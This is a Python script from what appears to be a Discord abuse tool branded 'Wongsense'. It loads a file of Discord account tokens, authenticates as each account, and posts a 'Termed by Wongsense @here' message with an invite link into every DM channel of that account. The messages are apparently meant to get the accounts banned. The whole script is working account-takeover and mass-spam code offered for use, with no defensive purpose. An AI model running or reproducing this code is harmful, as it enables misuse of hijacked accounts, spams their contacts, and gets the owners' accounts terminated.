import requests
import asyncio
import time
import aiofiles
from style.clear import clear
from style.logo import logo

t = time.strftime('%H:%M:%S')
rs = "\033[0m"
d = '\033[38;2;50;100;255m'
g = "\033[32m"
r = "\033[31m"
y = "\033[0;33m"

async def terminate():
    await clear()
    await logo()
    async with aiofiles.open('utils/tokens.txt', 'r') as file:
        tokens = [line.strip() for line in await file.readlines() if line.strip()]

    if not tokens:
        print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} No tokens available in the file {r}[FAILURE]{rs}")
        return

    message_data = {
        'content': 'Termed by Wongsense @here https://discord.gg/jRtHf5hUvQ'
    }
    for token in tokens:
        url_fetch_dms = 'https://discord.com/api/v10/users/@me/channels'
        headers = {
            'Authorization': token
        }
        response_dms = requests.get(url_fetch_dms, headers=headers)
        if response_dms.status_code == 200:
            dm_channels = [channel for channel in response_dms.json() if channel['type'] == 1]
            if dm_channels:
                print(f"                                     {d}[{rs}{t}{d}]{rs} {g}[+]{rs} Fetched closed DMs successfully for token {token[:5]} {g}[SUCCESS]{rs}")
            else:
                print(f"                                     {d}[{rs}{t}{d}]{rs} {y}[-]{rs} No closed DMs found for token {token[:5]} {y}[FAILURE]{rs}")
                continue
        else:
            print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Failed to fetch DMs: {response_dms.text} {r}[FAILURE]{rs}")
            continue

        for channel in dm_channels:
            channel_id = channel['id']
            url_send_message = f'https://discord.com/api/v10/channels/{channel_id}/messages'
            
            response_terminate = requests.post(url_send_message, headers=headers, json=message_data)
            
            if response_terminate.status_code == 200:
                print(f"                                     {d}[{rs}{t}{d}]{rs} {g}[+]{rs} Sent termination message to channel {channel_id} {g}[SUCCESS]{rs}")
            else:
                print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Failed to send termination message to channel {channel_id}: {response_terminate.text} {r}[FAILURE]{rs}")